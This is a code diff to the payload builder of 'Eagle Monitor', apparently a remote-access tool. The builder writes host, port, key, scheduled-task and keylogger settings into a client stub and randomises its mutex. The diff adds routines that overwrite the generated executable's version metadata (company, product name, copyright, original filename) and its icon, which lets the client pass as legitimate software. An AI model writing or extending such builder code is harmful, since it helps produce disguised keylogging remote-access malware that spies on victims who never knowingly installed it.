@@ -5,7 +5,7 @@ using System.IO;
 using dnlib.DotNet;
 using dnlib.DotNet.Emit;
 using System.Runtime.InteropServices;
-using System.Text;
+using Vestris.ResourceLib;
 
 /*
 || AUTHOR Arsium ||
@@ -25,8 +25,6 @@ namespace Eagle_Monitor_Builder
             internal static string GPath = Application.StartupPath;
 
             internal static string stubPath = GPath + "\\Stubs\\Client";
-
-            internal static string randomString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz|@#^{}[]`´~";
         }
 
         internal class Config
@@ -43,7 +41,7 @@ namespace Eagle_Monitor_Builder
             public bool is64BitStub { get; set; }
         }
 
-        internal void Build(string path, string dns, string port, string key, string taskName, string time, string keylog)
+        internal void Build(string path, string dns, string port, string key, string taskName, string time, string keylog, string[] assemblyInfo = null, string iconPath = null)
         {
             ModuleDefMD asmDef = ModuleDefMD.Load(path);
             try
@@ -61,28 +59,23 @@ namespace Eagle_Monitor_Builder
                             WriteSettings(asmDef, dns, port, key , taskName, time, keylog, saveFileDialog1.FileName);
                             asmDef.Write(saveFileDialog1.FileName);
                             asmDef.Dispose();
-                            MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                            WriteAssemblyInformation(saveFileDialog1.FileName, assemblyInfo[0], assemblyInfo[1], assemblyInfo[2], assemblyInfo[3], assemblyInfo[4], assemblyInfo[5], assemblyInfo[6], assemblyInfo[7]);
                         }
+
+                        if (!string.IsNullOrEmpty(iconPath))
+                            SetIcon(iconPath, saveFileDialog1.FileName);
+
+                        MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     }
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                MessageBox.Show(ex.ToString());
                 asmDef?.Dispose();
             }
         }
-        /*      public static string hostIp = "127.0.0.1";
-        public static string port = "7788";
-        public static string generalKey = "123456789";
-        public static string taskName = "%C%";
-        public static string time = "%1%";
-        public static string offKeylog = "0";*/
-
-        private readonly Random random = new Random();
-        private string NextString(int length) => new string((
-            from _ in Enumerable.Range(0, length)
-            let i = random.Next(0, Utils.randomString.Length)
-            select Utils.randomString[i]).ToArray());
 
         private void WriteSettings(ModuleDefMD asmDef, string dns, string port, string key, string taskName, string time, string offKeylog,string AsmName = "Client")
         {
@@ -129,11 +122,54 @@ namespace Eagle_Monitor_Builder
                                 if (method.Body.Instructions[i].Operand.ToString() == "%MUTEX%")
                                 {
 
-                                    method.Body.Instructions[i].Operand = "EM-" + NextString(24);
+                                    method.Body.Instructions[i].Operand = "EM-" + RandomString.NextString(24);
                                 }
                             }
                         }
                     }
+            }
+        }
+
+        private void WriteAssemblyInformation(string path, string fileVer, string prodVer, string prodName, string desc, string compName, string copyright, string trademarks, string orgiName) 
+        {
+            try
+            {
+                VersionResource versionResource = new VersionResource();
+                versionResource.LoadFrom(path);
+
+                versionResource.FileVersion = fileVer;
+                versionResource.ProductVersion = prodVer;
+                versionResource.Language = 0;
+
+                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                stringFileInfo["ProductName"] = prodName;
+                stringFileInfo["FileDescription"] = desc;
+                stringFileInfo["CompanyName"] = compName;
+                stringFileInfo["LegalCopyright"] = copyright;
+                stringFileInfo["LegalTrademarks"] = trademarks;
+                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
+                stringFileInfo["InternalName"] = orgiName;
+                stringFileInfo["OriginalFilename"] = orgiName;
+                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
+                stringFileInfo["FileVersion"] = versionResource.FileVersion;
+
+                versionResource.SaveTo(path);
+            }
+            catch (Exception)
+            {}
+        }
+
+        private void SetIcon(string iconPath, string exePath) 
+        {
+            try
+            {
+                IconFile iconFile = new IconFile(iconPath);
+                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
+                iconDirectoryResource.SaveTo(exePath);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
             }
         }
     }
